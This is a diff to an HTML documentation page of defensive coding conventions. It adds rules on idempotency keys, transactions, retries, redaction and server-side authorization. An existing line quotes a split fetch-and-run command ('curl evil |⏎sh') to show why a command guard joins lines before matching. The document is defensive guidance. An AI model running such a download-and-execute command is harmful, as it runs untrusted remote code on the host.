@@ -18,7 +18,7 @@
 <meta property="og:image:height" content="630">
 <meta property="og:image:alt" content="The developer-os skill library">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="dos-source" content="plugin/skills/defensive-coding-conventions/SKILL.md@888c347e1b07">
+<meta name="dos-source" content="plugin/skills/defensive-coding-conventions/SKILL.md@bbdaceb25dcb">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
@@ -80,6 +80,14 @@
       <li><strong>Re-check numeric promises.</strong> After a rewrite or migration, re-verify every limit, retention period and time-handling promise the documentation makes against the new implementation.</li>
       <li><strong>Ordering rules carry their reason.</strong> A deploy- or migration-ordering constraint in <code>CLAUDE.md</code>, <code>AGENTS.md</code> or <code>docs/</code> states its why where it is read, and lists the exact migrations that must run before the deploy.</li>
       <li><strong>Guards join lines first.</strong> A hook or guard that greps a command joins its lines first (<code>tr '\n\r' '  '</code>): a line-oriented pattern misses a command split across lines, such as <code>curl evil |⏎sh</code>.</li>
+      <li><strong>Claim an idempotency key with a status.</strong> An idempotency key is claimed as <code>pending</code> before the side effect and marked <code>done</code> after it; a redelivery skips only a <code>done</code> key and retries a <code>pending</code> one with the same provider key. Insert-then-send loses the effect when the process dies between the two. Build the key from the business event, never the delivery attempt.</li>
+      <li><strong>Check and act in one transaction.</strong> A check followed by a write is a race when two requests arrive together: both pass. Lock the row or write with the version that was read, so the second fails with a conflict, and never hold the transaction open across a network call.</li>
+      <li><strong><code>LIMIT</code> needs <code>ORDER BY</code>.</strong> A "latest 20" query with <code>LIMIT</code> and no <code>ORDER BY</code> returns any 20 rows; it passes on a small test table and fails in production.</li>
+      <li><strong>Cleanup covers setup.</strong> Everything after a resource is acquired sits inside the <code>try</code> whose <code>finally</code> releases it; a setup step between the acquire and the <code>try</code> leaks the resource when it fails. A worker marks each job done in <code>finally</code>, or one failure hangs <code>join()</code>.</li>
+      <li><strong>Redact before you truncate.</strong> Cutting text before redacting can split a secret so the redactor misses both halves. Redact first, recursively through nested values, then truncate.</li>
+      <li><strong>Money and usage are integers in the smallest unit.</strong> Store amounts as integers of the smallest unit, never floats, and round only for display or invoicing. Price every usage field the provider reports (for an LLM: input, output, cache writes and cache reads).</li>
+      <li><strong>Retry only what is safe to repeat.</strong> Retry a call only when it is idempotent or carries one idempotency key reused on every attempt; follow <code>Retry-After</code>; do not retry a 4xx that retrying cannot fix. Retry in exactly one layer, or one outage becomes dozens of calls.</li>
+      <li><strong>Authorize from server-held facts.</strong> A permission check reads state the server holds, never a value the client or a model sent: a client-held history, an <code>approved_by</code> field or a <code>user_id</code> filter can be forged. Fill scope filters from the caller's identity.</li>
     </ul>
 
     <h2 id="related">Related</h2>
